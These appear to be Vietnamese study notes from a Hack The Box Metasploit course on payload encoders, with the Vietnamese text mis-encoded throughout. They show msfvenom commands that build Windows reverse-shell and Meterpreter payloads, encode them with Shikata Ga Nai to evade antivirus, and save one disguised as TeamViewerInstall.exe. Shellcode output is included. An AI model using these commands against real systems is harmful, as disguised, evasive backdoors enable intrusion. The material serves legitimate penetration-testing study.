Encoder 


Trong suá»‘t 15 nÄƒm tá»“n táº¡i cá»§a Metasploit Framework, Encoders Ä‘Ã£ há»— trá»£ viá»‡c lÃ m cho cÃ¡c payload tÆ°Æ¡ng thÃ­ch vá»›i nhiá»u kiáº¿n trÃºc vi xá»­ lÃ½ khÃ¡c nhau, Ä‘á»“ng thá»i giÃºp trÃ¡nh nÃ© cÃ¡c pháº§n má»m diá»‡t virus.
Encoders Ä‘Ã³ng vai trÃ² thay Ä‘á»•i payload Ä‘á»ƒ cÃ³ thá»ƒ cháº¡y Ä‘Æ°á»£c trÃªn cÃ¡c há»‡ Ä‘iá»u hÃ nh vÃ  kiáº¿n trÃºc khÃ¡c nhau.
CÃ¡c kiáº¿n trÃºc nÃ y bao gá»“m: x64, x86, sparc, ppc, mips.

Encoders cÅ©ng cáº§n thiáº¿t Ä‘á»ƒ loáº¡i bá» cÃ¡c opcode dáº¡ng hex vá»‘n Ä‘Æ°á»£c biáº¿t Ä‘áº¿n nhÆ° cÃ¡c bad characters trong payload. KhÃ´ng chá»‰ váº­y, viá»‡c mÃ£ hÃ³a payload á»Ÿ cÃ¡c Ä‘á»‹nh dáº¡ng khÃ¡c nhau cÃ²n cÃ³ thá»ƒ giÃºp trÃ¡nh bá»‹ phÃ¡t hiá»‡n bá»Ÿi pháº§n má»m diá»‡t virus (AV) nhÆ° Ä‘Ã£ Ä‘á» cáº­p á»Ÿ trÃªn. Tuy nhiÃªn, viá»‡c sá»­ dá»¥ng encoders chá»‰ nháº±m má»¥c Ä‘Ã­ch nÃ© AV Ä‘Ã£ giáº£m dáº§n theo thá»i gian, do cÃ¡c hÃ£ng IPS/IDS Ä‘Ã£ cáº£i thiá»‡n kháº£ nÄƒng xá»­ lÃ½ chá»¯ kÃ½ (signatures) trong mÃ£ Ä‘á»™c vÃ  virus. Shikata Ga Nai (SGN) tá»«ng lÃ  má»™t trong nhá»¯ng phÆ°Æ¡ng thá»©c mÃ£ hÃ³a (encoding scheme) Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u nháº¥t trÆ°á»›c Ä‘Ã¢y, vÃ¬ nÃ³ khiáº¿n payload ráº¥t khÃ³ bá»‹ phÃ¡t hiá»‡n. Tuy nhiÃªn, ngÃ y nay cÃ¡c phÆ°Æ¡ng phÃ¡p phÃ¡t hiá»‡n hiá»‡n Ä‘áº¡i Ä‘Ã£ báº¯t ká»‹p, vÃ  nhá»¯ng payload Ä‘Æ°á»£c mÃ£ hÃ³a theo cÆ¡ cháº¿ nÃ y khÃ´ng cÃ²n â€œáº©n thÃ¢nâ€ má»™t cÃ¡ch phá»• quÃ¡t ná»¯a.TÃªn gá»i ä»•æ–¹ãŒãªã„ (Shikata Ga Nai) trong tiáº¿ng Nháº­t cÃ³ nghÄ©a lÃ  â€œKhÃ´ng thá»ƒ trÃ¡nh Ä‘Æ°á»£c / KhÃ´ng cÃ²n cÃ¡ch nÃ o khÃ¡câ€. Ã nghÄ©a nÃ y hoÃ n toÃ n Ä‘Ãºng náº¿u chÃºng ta nÃ³i vá» nÃ³ vÃ i nÄƒm trÆ°á»›c. Tuy nhiÃªn, hiá»‡n nay Ä‘Ã£ cÃ³ nhá»¯ng phÆ°Æ¡ng phÃ¡p khÃ¡c mÃ  chÃºng ta cÃ³ thá»ƒ khÃ¡m phÃ¡ Ä‘á»ƒ nÃ© trÃ¡nh há»‡ thá»‘ng báº£o vá»‡. BÃ i viáº¿t tá»« FireEye giáº£i thÃ­ch chi tiáº¿t táº¡i sao vÃ  nhÆ° tháº¿ nÃ o mÃ  Shikata Ga Nai tá»«ng thá»‘ng trá»‹ so vá»›i cÃ¡c encoder khÃ¡c.
  Shikata Ga Nai : https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/
SGN lÃ  má»™t encoder Ä‘a hÃ¬nh thá»©c (polymorphic XOR additive feedback encoder). Má»—i láº§n mÃ£ hÃ³a shellcode sáº½ táº¡o ra má»™t káº¿t quáº£ khÃ¡c nhau nhá» cÃ¡c ká»¹ thuáº­t nhÆ°:
  Thay tháº¿ Ä‘á»™ng cÃ¡c lá»‡nh (instruction substitution),
  Thay Ä‘á»•i thá»© tá»± khá»‘i lá»‡nh (dynamic block ordering),
  LuÃ¢n chuyá»ƒn ngáº«u nhiÃªn cÃ¡c thanh ghi (register),
  ThÃªm mÃ£ rÃ¡c (junk code),
  Sá»­ dá»¥ng khÃ³a ngáº«u nhiÃªn (random key),
  VÃ  thÃªm khoáº£ng trá»‘ng lá»‡nh ngáº«u nhiÃªn...
  Äiá»u nÃ y giÃºp táº¡o ra kháº£ nÄƒng mÃ£ hÃ³a tá»± giáº£i mÃ£ (self-decoding) vá»›i váº» ngoÃ i ráº¥t ngáº«u nhiÃªn, gÃ¢y khÃ³ khÄƒn cho cÃ¡c cÃ´ng cá»¥ phÃ¡t hiá»‡n tÄ©nh  
NhÆ°ng hiá»‡n táº¡i khÃ´ng kháº£ thi ná»¯a r. CÃ¡c AV, IDS IPS Ä‘Æ°á»£c cáº£i tiáº¿n nhiá»u hÆ¡n 

TrÆ°á»›c nÄƒm 2015, Metasploit Framework cÃ³ cÃ¡c module con riÃªng Ä‘á»ƒ xá»­ lÃ½ payloads vÃ  encoders. ChÃºng Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i tÃ¡ch biá»‡t khá»i script msfconsole vÃ  Ä‘Æ°á»£c gá»i lÃ  msfpayload vÃ  msfencode. Hai cÃ´ng cá»¥ nÃ y náº±m trong thÆ° má»¥c:
  /usr/share/framework2/
Náº¿u chÃºng ta muá»‘n táº¡o payload tÃ¹y chá»‰nh, ta cÃ³ thá»ƒ lÃ m Ä‘iá»u Ä‘Ã³ báº±ng msfpayload, nhÆ°ng sau Ä‘Ã³ cáº§n pháº£i mÃ£ hÃ³a (encode) payload nÃ y theo Ä‘Ãºng kiáº¿n trÃºc há»‡ Ä‘iá»u hÃ nh má»¥c tiÃªu báº±ng msfencode.
Má»™t pipeline (dáº¥u â€œ|â€) sáº½ láº¥y Ä‘áº§u ra tá»« lá»‡nh Ä‘áº§u tiÃªn vÃ  chuyá»ƒn cho lá»‡nh tiáº¿p theo, tá»« Ä‘Ã³ sinh ra má»™t payload Ä‘Ã£ Ä‘Æ°á»£c mÃ£ hÃ³a, sáºµn sÃ ng gá»­i Ä‘i vÃ  cháº¡y trÃªn mÃ¡y má»¥c tiÃªu

  naruto3co@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
  [*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
  my $buf = 
  "\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
  "\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
  "\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
  "\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
  "\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
  "\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
  "\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
  "\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
  "\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
  "\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
  "\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
  "\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
  "\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .
  <SNIP>

Tá»« sau nÄƒm 2015, hai cÃ´ng cá»¥ riÃªng biá»‡t:
  msfpayload (táº¡o payload)
  msfencode (mÃ£ hÃ³a payload)
ğŸ‘‰ Ä‘Ã£ Ä‘Æ°á»£c gá»™p láº¡i thÃ nh má»™t cÃ´ng cá»¥ duy nháº¥t lÃ  msfvenom.


Generating Payload - Without Encoding
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
  Found 11 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 381 (iteration=0)
  x86/shikata_ga_nai chosen with final size 381
  Payload size: 381 bytes
  Final size of perl file: 1674 bytes
  my $buf = 
  "\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
  "\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
  "\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
  "\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
  "\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .

Xem nÃ³ thay Ä‘á»•i nhÆ° nÃ o náº¿u Ã¡p dá»¥ng encoder shikata_ga_nai

Generating Payload - With Encoding
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
  Found 1 compatible encoders
  Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 326 (iteration=0)
  x86/shikata_ga_nai succeeded with size 353 (iteration=1)
  x86/shikata_ga_nai succeeded with size 380 (iteration=2)
  x86/shikata_ga_nai chosen with final size 380
  Payload size: 380 bytes
  buf = ""
  buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
  buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
  buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
  buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
  buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

Tham kháº£o "https://hatching.io/blog/metasploit-payloads2/"

Náº¿u muá»‘n xem xÃ©t hoáº¡t Ä‘á»™ng cá»§a bá»™ mÃ£ hÃ³a shikata_ga_nai, chÃºng ta cÃ³ thá»ƒ tham kháº£o má»™t bÃ i viáº¿t tuyá»‡t vá»i táº¡i Ä‘Ã¢y.
Giáº£ sá»­ chÃºng ta muá»‘n chá»n má»™t bá»™ mÃ£ hÃ³a cho má»™t payload hiá»‡n cÃ³. Sau Ä‘Ã³, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng lá»‡nh show encoders trong msfconsole Ä‘á»ƒ xem nhá»¯ng bá»™ mÃ£ hÃ³a nÃ o kháº£ dá»¥ng cho tá»• há»£p mÃ´-Ä‘un Exploit + Payload hiá»‡n táº¡i cá»§a chÃºng ta.

  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
  payload => windows/x64/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
  Compatible Encoders
  ===================
     #  Name              Disclosure Date  Rank    Check  Description
     -  ----              ---------------  ----    -----  -----------
     0  generic/eicar                      manual  No     The EICAR Encoder
     1  generic/none                       manual  No     The "none" Encoder
     2  x64/xor                            manual  No     XOR Encoder
     3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
     4  x64/zutto_dekiru                   manual  No     Zutto Dekiru  

Lá»‡nh show encoders nÃ³ chá»‰ lá»c nhá»¯ng encoder há»£p lá»‡ theo exploit 
HÃ£y xem xÃ©t vÃ­ dá»¥ trÃªn nhÆ° má»™t vÃ­ dá»¥ giáº£ Ä‘á»‹nh. Náº¿u chÃºng ta mÃ£ hÃ³a má»™t payload thá»±c thi chá»‰ má»™t láº§n báº±ng SGN, ráº¥t cÃ³ thá»ƒ nÃ³ sáº½ bá»‹ háº§u háº¿t cÃ¡c pháº§n má»m diá»‡t virus hiá»‡n nay phÃ¡t hiá»‡n. HÃ£y cÃ¹ng tÃ¬m hiá»ƒu sÃ¢u hÆ¡n vá» Ä‘iá»u nÃ y. Láº¥y msfvenom, chá»‰ sá»‘ dÆ°á»›i cá»§a Framework xá»­ lÃ½ viá»‡c táº¡o payload vÃ  cÃ¡c lÆ°á»£c Ä‘á»“ mÃ£ hÃ³a, chÃºng ta cÃ³ dá»¯ liá»‡u Ä‘áº§u vÃ o sau:

  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 368 (iteration=0)
  x86/shikata_ga_nai chosen with final size 368
  Payload size: 368 bytes
  Final size of exe file: 73802 bytes
  Saved as: TeamViewerInstall.exe

check trÃªn virusTotal Ä‘á» lÃ²m =)) 

Má»™t lá»±a chá»n tá»‘t hÆ¡n lÃ  thá»­ cháº¡y nÃ³ qua nhiá»u láº§n láº·p láº¡i cá»§a cÃ¹ng má»™t lÆ°á»£c Ä‘á»“ mÃ£ hÃ³a:
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
  Found 1 compatible encoders
  Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 368 (iteration=0)
  x86/shikata_ga_nai succeeded with size 395 (iteration=1)
  x86/shikata_ga_nai succeeded with size 422 (iteration=2)
  x86/shikata_ga_nai succeeded with size 449 (iteration=3)
  x86/shikata_ga_nai succeeded with size 476 (iteration=4)
  x86/shikata_ga_nai succeeded with size 503 (iteration=5)
  x86/shikata_ga_nai succeeded with size 530 (iteration=6)
  x86/shikata_ga_nai succeeded with size 557 (iteration=7)
  x86/shikata_ga_nai succeeded with size 584 (iteration=8)
  x86/shikata_ga_nai succeeded with size 611 (iteration=9)
  x86/shikata_ga_nai chosen with final size 611
  Payload size: 611 bytes
  Final size of exe file: 73802 bytes
  Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe

-> lá»‡nh tÃªn cÃ³ -i 10 lÃ  láº·p láº¡i mÃ£ hoÃ¡ 10 láº§n Ä‘á»ƒ tÄƒng kháº£ nÄƒng bypass AV 
NhÆ°ng váº«n Ä‘á» lÃ²m 

CÃ³ thá»ƒ check trá»±c tiáº¿p qua cÃ¢u lá»‡nh vá»›i Ä‘iá»u kiá»‡n lÃ  cáº§n API key free trÃªn virus total 
  naruto3co@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe




